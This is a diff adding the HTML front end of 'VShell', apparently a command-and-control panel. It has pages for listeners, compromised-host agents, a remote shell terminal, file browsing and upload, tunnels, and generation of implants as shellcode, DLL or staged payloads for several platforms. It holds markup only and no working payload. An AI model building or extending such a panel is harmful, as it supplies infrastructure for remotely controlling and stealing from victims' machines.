@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VShell 管理平台</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+<div id="app">
+    <div id="login-container" class="login-wrapper">
+        <div class="login-card">
+            <div class="login-header">
+                <h1>VShell 管理平台</h1>
+                <p>Backstage Management System</p>
+            </div>
+            <form id="login-form">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" id="login-username" placeholder="admin" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="login-password" placeholder="Password" required>
+                </div>
+                <button type="submit" id="login-btn" class="btn-primary btn-full">Sign In</button>
+                <div id="login-error" class="error-msg" style="display:none"></div>
+            </form>
+        </div>
+    </div>
+    <div id="main-container" class="main-layout" style="display:none">
+        <aside class="sidebar">
+            <div class="sidebar-header"><h2>VShell</h2></div>
+            <nav class="sidebar-nav">
+                <a href="#" class="nav-item active" data-page="dashboard">Dashboard</a>
+                <a href="#" class="nav-item" data-page="listeners">Listeners</a>
+                <a href="#" class="nav-item" data-page="clients">Agents</a>
+                <a href="#" class="nav-item" data-page="terminal">Terminal</a>
+                <a href="#" class="nav-item" data-page="files">Files</a>
+                <a href="#" class="nav-item" data-page="download">Download</a>
+                <a href="#" class="nav-item" data-page="tunnels">Tunnels</a>
+                <a href="#" class="nav-item" data-page="plugins">Plugins</a>
+                <a href="#" class="nav-item" data-page="settings">Settings</a>
+            </nav>
+            <div class="sidebar-footer"><button id="logout-btn" class="btn-text">Logout</button></div>
+        </aside>
+        <main class="content">
+            <div id="pageTitle" style="display:none"></div>
+            <div id="page-dashboard" class="page active">
+                <h2>Dashboard</h2>
+                <div class="stats-grid">
+                    <div class="stat-card"><div class="stat-value" id="stat-online">0</div><div class="stat-label">Online</div></div>
+                    <div class="stat-card"><div class="stat-value" id="stat-total">0</div><div class="stat-label">Total Agents</div></div>
+                    <div class="stat-card"><div class="stat-value" id="stat-listeners">0</div><div class="stat-label">Listeners</div></div>
+                    <div class="stat-card"><div class="stat-value" id="stat-tunnels">0</div><div class="stat-label">Tunnels</div></div>
+                </div>
+                <div id="sys-info" class="info-list section"></div>
+            </div>
+            <div id="page-listeners" class="page">
+                <div class="page-header"><h2>Listeners</h2><button id="add-listener-btn" class="btn-primary">+ Add</button></div>
+                <div id="listener-form" class="form-card" style="display:none">
+                    <div class="form-row">
+                        <input type="text" id="l-addr" placeholder="Listen Addr (0.0.0.0:443)">
+                        <input type="text" id="l-connect" placeholder="Connect Addr">
+                    </div>
+                    <div class="form-row">
+                        <select id="l-mode"><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option><option value="websocket">WebSocket</option><option value="kcp">KCP</option></select>
+                        <input type="text" id="l-vkey" placeholder="Verify Key">
+                        <input type="text" id="l-salt" placeholder="Encrypt Salt">
+                    </div>
+                    <div class="form-row">
+                        <input type="text" id="l-remark" placeholder="Remark">
+                        <button id="l-save-btn" class="btn-primary">Save</button>
+                        <button id="l-cancel-btn" class="btn-text">Cancel</button>
+                    </div>
+                </div>
+                <div id="listener-list" class="data-table"></div>
+            </div>
+            <div id="page-clients" class="page"><h2>Agents</h2><div id="client-list" class="data-table"></div></div>
+            <div id="page-terminal" class="page">
+                <h2>Terminal</h2>
+                <div class="form-row">
+                    <select id="term-client-select"></select>
+                    <select id="term-type"><option value="cmd">CMD</option><option value="powershell">PowerShell</option><option value="bash">Bash</option></select>
+                    <button id="term-connect-btn" class="btn-primary">Connect</button>
+                </div>
+                <div id="terminal-output" class="terminal-window"></div>
+                <input type="text" id="terminal-input" placeholder="Type command..." autocomplete="off">
+            </div>
+            <div id="page-files" class="page">
+                <h2>Files</h2>
+                <div class="form-row">
+                    <select id="file-client-select"></select>
+                    <input type="text" id="file-path" value="/">
+                    <button id="file-ls-btn" class="btn-primary">Browse</button>
+                    <button id="file-upload-btn" class="btn-primary">Upload</button>
+                </div>
+                <div id="file-list" class="data-table"></div>
+            </div>
+            <div id="page-download" class="page">
+                <h2>Agent Generation</h2>
+                <div class="tabs">
+                    <button class="tab active" data-tab="tcp">TCP</button>
+                    <button class="tab" data-tab="ws">WebSocket</button>
+                    <button class="tab" data-tab="kcp">KCP</button>
+                    <button class="tab" data-tab="cdn">CDN</button>
+                </div>
+                <div class="form-row">
+                    <input type="text" id="dl-host" placeholder="Host">
+                    <input type="number" id="dl-port" placeholder="Port" value="8082">
+                </div>
+                <div class="form-row">
+                    <select id="dl-platform"><option value="windows">Windows</option><option value="linux">Linux</option><option value="darwin">macOS</option></select>
+                    <select id="dl-arch"><option value="amd64">x64</option><option value="386">x86</option><option value="arm64">ARM64</option></select>
+                    <select id="dl-type"><option value="stageless">Stageless</option><option value="stage">Stage</option><option value="shellcode">Shellcode</option><option value="dll">DLL</option></select>
+                </div>
+                <div id="dl-commands"><h3>Commands</h3><pre id="dl-cmd" class="code-block"></pre></div>
+            </div>
+            <div id="page-tunnels" class="page"><h2>Tunnels</h2><div id="tunnel-list" class="data-table"></div></div>
+            <div id="page-plugins" class="page"><h2>Plugins</h2><div id="plugin-list" class="data-table"></div></div>
+            <div id="page-settings" class="page"><h2>Settings</h2><div id="settings-form" class="form-card"></div></div>
+        </main>
+    </div>
+</div>
+<script src="/static/js/app.js"></script>
+</body>
+</html>
